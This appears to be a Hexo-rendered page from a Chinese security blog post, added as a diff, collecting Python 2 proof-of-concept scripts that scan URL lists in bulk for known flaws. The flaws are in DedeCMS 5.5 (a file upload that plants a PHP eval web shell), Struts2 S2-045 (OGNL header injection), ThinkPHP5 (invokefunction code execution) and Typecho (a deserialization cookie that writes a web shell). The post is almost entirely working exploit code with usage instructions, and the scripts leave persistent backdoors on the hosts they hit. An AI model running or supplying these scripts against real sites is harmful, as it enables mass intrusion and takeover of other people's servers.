@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>poc脚本整理 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="poc脚本整理">
+<meta property="og:url" content="http://yoursite.com/2019/03/23/一些脚本poc/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-03-23T12:42:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="poc脚本整理">
+<meta name="twitter:description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-一些脚本poc" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/23/一些脚本poc/" class="article-date">
+  <time datetime="2019-03-22T16:00:00.000Z" itemprop="datePublished">2019-03-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      poc脚本整理
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="织梦dede"><a href="#织梦dede" class="headerlink" title="织梦dede"></a>织梦dede</h1><p>漏洞版本：Dedecms 5.5</p>
+<p>织梦(Dedecms)select_soft_post.php页面变量未初始漏洞</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import requests
+import threading
+import time
+import sys
+
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        requests.packages.urllib3.disable_warnings()
+        payload = &quot;include/dialog/select_soft_post.php&quot;
+        multipart_form_data = {
+        &apos;activepath&apos;:(None,&apos;/data/cache&apos;),
+        &apos;cfg_basedir&apos;:(None,&apos;../../&apos;),
+        &apos;cfg_imgtype&apos;:(None,&apos;php&apos;),
+        &apos;cfg_not_allowall&apos;:(None,&apos;txt&apos;),
+        &apos;cfg_softtype&apos;:(None,&apos;php&apos;),
+        &apos;cfg_mediatype&apos;:(None,&apos;php&apos;),
+        &apos;f&apos;:(None,&apos;form1.enclosure&apos;),
+        &apos;job&apos;:(None,&apos;upload&apos;),
+        &apos;newname&apos;:(None,&apos;hag.php&apos;),
+        &apos;uploadfile&apos;:(&apos;hag.php&apos;,&apos;&lt;?php eval($_POST[q]);?&gt;&apos;,&apos;application/octet-stream&apos;),
+        }
+        try:
+            r = requests.post(self.url.strip()+payload,files=multipart_form_data,timeout=6,verify=False)
+        except IOError:
+            print &quot;time out 1&quot;
+        newurl=self.url.strip()+&quot;data/cache/hag.php&quot;
+        payloads={&apos;q&apos;:&apos;echo &quot;sectest&quot;;&apos;}
+        try:
+            rr=requests.post(newurl,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功
+            body=rr.text
+            if body.find(&apos;sectest&apos;)!=-1:
+                with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1:
+                    f1.write(newurl+&quot;\n&quot;)
+                print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+            else:
+                print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+        except IOError:
+            print &quot;time out 2&quot;
+        self.sem.release()
+
+if __name__ == &apos;__main__&apos;:
+    f = open(&quot;./1.txt&quot;)
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for url in f.readlines():
+        sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+
+        host_thread = check(url,sem)
+        host_thread.start()#执行check()的执行函数</code></pre><p>使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h1><p>java的漏洞，s2-045网上可找到详情。</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import urllib2
+import threading
+import requests
+requests.packages.urllib3.disable_warnings()
+
+
+header = {
+        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
+        &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;,
+        &apos;Cache-Control&apos;: &apos;max-age=0&apos;,
+        &apos;Connection&apos;: &apos;close&apos;,
+        &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;,
+        &apos;Content-Type&apos;:&quot;%{(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}&quot;
+    }
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+
+            try:
+                response = requests.post(self.url,data=&apos;&apos;,headers=header,verify=False,allow_redirects = False,timeout=6)
+                if response.content.find(&quot;88866777&quot;)!=-1:
+                    print &apos;success------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+                    with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1:
+                        f1.write(newurl+&quot;\n&quot;)
+                else:
+                    print &apos;fail---------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+            except Exception as e:
+                print &apos;timeout------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+            self.sem.release()
+
+
+if __name__ == &quot;__main__&quot;:
+    urls = open(&apos;./url.txt&apos;, &apos;r&apos;)
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for url in urls.readlines():
+        url = url.strip(&apos;\n&apos;)
+        url = url.split(&apos;%3F&apos;, 1)[0]
+        sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+        host_thread = check(url,sem)
+        host_thread.start()#执行check()的执行函数</code></pre><p>使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h1><p>thinkphp5命令执行</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import requests
+import threading
+import time
+import sys
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        parameters = &quot;s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1&quot;
+
+        try:
+            responce = requests.get(url = self.url, params = parameters,timeout=3)
+            body = responce.text
+            if body.find(&apos;PHP Extension&apos;) != -1:
+                with open(&quot;success.txt&quot;, &quot;a+&quot;) as f1:
+                    f1.write(&quot;存在tp5远程代码执行漏洞: &quot; + self.url + &quot;\n&quot;)
+                    print(&quot;[+] &quot; + self.url)
+            else:
+                print(&quot;[-] &quot; + self.url)
+        except Exception,err:
+            print(&quot;connect failed&quot;)
+            pass
+        self.sem.release()             #执行完函数，释放线程，线程数加1
+
+class host(threading.Thread):          #遍历文件操作
+    def __init__(self, sem):
+        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
+        self.sem = sem
+
+    def run(self):
+        with open(&quot;url.txt&quot;, &quot;r&quot;) as f:
+            for host in f.readlines():
+                self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+                host = host.strip()+&quot;/public/index.php&quot;
+                host_thread = check(host, self.sem)  
+                host_thread.start()    #执行check()的执行函数
+
+if __name__ == &apos;__main__&apos;:
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    thread = host(sem)                 #传递sem值
+    thread.start()</code></pre><p>使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="typecho"><a href="#typecho" class="headerlink" title="typecho"></a>typecho</h1><p>typecho反序列化漏洞</p>
+<pre><code>#/usr/bin/env python
+# -*- coding: UTF-8 -*-
+import getopt,sys
+import requests
+import sys
+import string
+import time
+import threading
+
+class check(threading.Thread): 
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        headers = {
+                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;,
+                &apos;Referer&apos;: self.url,
+                &apos;cookie&apos;: &quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot;
+                }
+        try:
+            reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False)
+            #print(reqs.status_code),
+        except IOError:                  #如果网站打不开将输出fail
+            print(&quot;time out 1&quot;)
+        urls=self.url+&quot;/p0.php&quot;
+        urlsss=self.url+&quot;/install.php?finish=1&quot;
+        payloads={&apos;p0&apos;:&apos;echo &quot;sectest&quot;;&apos;}
+        try:
+            reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功
+            body=reqss.text
+            if body.find(&apos;sectest&apos;)!=-1:
+                 print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+                 with open(&quot;./success.txt&quot;, &quot;a+&quot;) as f1:
+                    f1.write(self.url + &quot;\n&quot;)
+            else: 
+                 print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+            print(&apos;\n&apos;)
+        except IOError:                  #如果网站打不开将输出fail
+            print(&quot;time out 2&quot;)
+        self.sem.release()
+
+if __name__ == &apos;__main__&apos;:
+    reload(sys)#同下解决中文乱码
+    sys.setdefaultencoding(&apos;utf-8&apos;)#解决中文乱码
+    f = open(&quot;./1.txt&quot;)#打开批量扫描的网站文件
+    s=requests.Session()
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for line in f.readlines():#读取每一行的网站
+            line=line.strip(&apos;\n&apos;)#消去换行
+            url=line#每行的网站赋值给url
+            host_thread = check(url,sem)
+            host_thread.start()#执行check()的执行函数</code></pre><p>使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/23/一些脚本poc/" data-id="ck0l0oh9s001mpy2iuq22kah3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/08/掘安杯/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          掘安杯网络安全技能挑战赛
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/03/18/phpcms常见漏洞/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">phpcms常见漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
